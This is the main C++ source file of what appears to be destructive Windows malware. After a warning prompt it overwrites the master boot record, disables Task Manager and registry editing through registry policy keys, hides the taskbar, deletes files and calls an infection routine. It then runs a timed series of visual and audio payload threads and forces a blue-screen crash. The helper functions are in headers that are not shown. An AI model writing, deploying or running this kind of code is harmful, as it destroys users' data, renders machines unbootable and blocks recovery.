#include "payloads.h"
#include "sounds.h"
using namespace Sounds;
using namespace Payloads;

int main() {
    srand(time(0));
    
    if (WarnUser()) 
    {
        OverwriteMBR();
        Regedit(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableTaskmgr", REG_DWORD, 1);
        Regedit(HKEY_CURRENT_USER, L"Software\\Microsoft\\Windows\\CurrentVersion\\Policies\\System", L"DisableRegistryTools", REG_DWORD, 1);
        HideTaskbar();
        SetThreadExecutionState(ES_CONTINUOUS | ES_DISPLAY_REQUIRED | ES_SYSTEM_REQUIRED);
        DeleteFiles();
        Infect();

        Sleep(7000);

        CreateThread(0, 0, crazyMouse, 0, 0, 0);

        Sleep(2000);
        
        HANDLE thread1 = CreateThread(0, 0, payload1, 0, 0, 0);
        audio1();
        Sleep(50000);
        TerminatePayload(thread1);

        ClearScreen();

        HANDLE thread2 = CreateThread(0, 0, payload2, 0, 0, 0);
        audio2();
        Sleep(45000);
        TerminatePayload(thread2);

        ClearScreen();

        HANDLE thread3 = CreateThread(0, 0, payload3, 0, 0, 0);
        audio3();
        Sleep(50000);
        TerminatePayload(thread3);

        ClearScreen();

        HANDLE thread4 = CreateThread(0, 0, payload4, 0, 0, 0);
        HANDLE thread_circle = CreateThread(0, 0, circle, 0, 0, 0);
        audio4();
        Sleep(45000);
        TerminatePayload(thread4);

        ClearScreen();
        
        HANDLE thread5 = CreateThread(0, 0, payload5, 0, 0, 0);
        audio5();
        Sleep(45000);
        TerminatePayload(thread5);

        ClearScreen();

        HANDLE thread6 = CreateThread(0, 0, payload6, 0, 0, 0);
        HANDLE thread_square = CreateThread(0, 0, square, 0, 0, 0);
        audio6();
        Sleep(40000);
        TerminatePayload(thread6);
        TerminatePayload(thread_circle);
        TerminatePayload(thread_square);

        ClearScreen();

        HANDLE thread7 = CreateThread(0, 0, payload7, 0, 0, 0);
        audio7();
        Sleep(40000);
        TerminatePayload(thread7);

        ClearScreen();

        HANDLE thread8 = CreateThread(0, 0, payload8, 0, 0, 0);
        audio8();
        Sleep(40000);
        TerminatePayload(thread8);

        ClearScreen();

        HANDLE thread9 = CreateThread(0, 0, payload9, 0, 0, 0);
        audio9();
        Sleep(25000);
        
        BSOD();
        Sleep(-1);
    } else {
        ExitProcess(0);
    }
}

